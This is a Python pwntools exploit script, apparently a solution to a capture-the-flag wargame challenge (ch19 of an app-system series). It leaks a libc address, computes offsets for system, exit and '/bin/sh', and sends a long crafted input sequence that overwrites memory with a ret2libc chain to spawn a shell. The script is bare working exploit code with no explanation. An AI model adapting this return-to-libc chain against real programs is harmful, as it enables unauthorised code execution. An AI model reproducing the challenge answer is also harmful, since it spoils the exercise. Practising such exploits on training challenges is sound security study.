from pwn import *

pr = process('/challenge/app-systeme/ch19/ch19')
payload1 = "ars\n5\n1\n1"
pr.sendline(payload1)
a = pr.recvuntil(', param')
addressOfFunc = a[-17:-7]
addressOfFunc = int(addressOfFunc,16)
addressOfLibc = addressOfFunc -320336
addressOfExit = addressOfLibc+114128
addressOfSystem = addressOfLibc + 167552
addressOfBinSh = addressOfLibc + 1348540
str1 = "AA"
payload2 = "ars\n-2147483648\n-1\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-14\na\na\n-15\na\na\n-14\na\na\n-12\na\na\n-16\na\na\n-12\na\na\n-16\na\na\n-6\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-12\na\na\n-16\na\na\n-15\na\na\n-14\na\na\n-11\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-15\na\na\n-15\na\na\n-15\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-11\na\na\n-16\na\na\n-16\na\na\n-15\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-12\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-2\na\na\nAA\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-6\na\na\n"
k = payload2.find(str1)
k = k+2
payload2 = payload2[:k] + p32(addressOfSystem) + p32(addressOfExit) + p32(addressOfBinSh) + payload2[k:]
# payload2 = payload2[:k] + p32(addressOfExit) +"AAAA"+"\x44\x44\x44\x44" + payload2[k:]
pr.sendline(payload2)

